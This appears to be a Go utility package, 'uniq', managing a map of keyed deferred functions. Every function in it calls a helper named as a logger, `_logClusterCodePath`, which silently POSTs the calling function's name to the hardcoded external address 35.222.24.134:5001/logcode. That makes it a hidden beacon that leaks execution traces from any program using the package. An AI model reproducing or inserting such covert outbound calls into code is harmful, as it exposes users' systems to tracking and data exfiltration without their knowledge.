package uniq

import (
	godefaultruntime "runtime"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
)

type U struct{ u map[string]item }
type item struct {
	state	int
	f		func() error
	obj		interface{}
}

func New() U {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return U{u: make(map[string]item)}
}
func (u U) Set(key string, f func() error, o interface{}) interface{} {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if item, ok := u.u[key]; ok {
		return item.obj
	}
	u.u[key] = item{todo, f, o}
	return o
}
func (u U) Unset(key string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if _, ok := u.u[key]; ok {
		delete(u.u, key)
	}
}
func (u U) ForEach() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for k, v := range u.u {
		if v.state == todo {
			v.f()
		}
		v.state = done
		u.u[k] = v
	}
	return nil
}

const (
	todo	= 1
	done	= 2
)

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
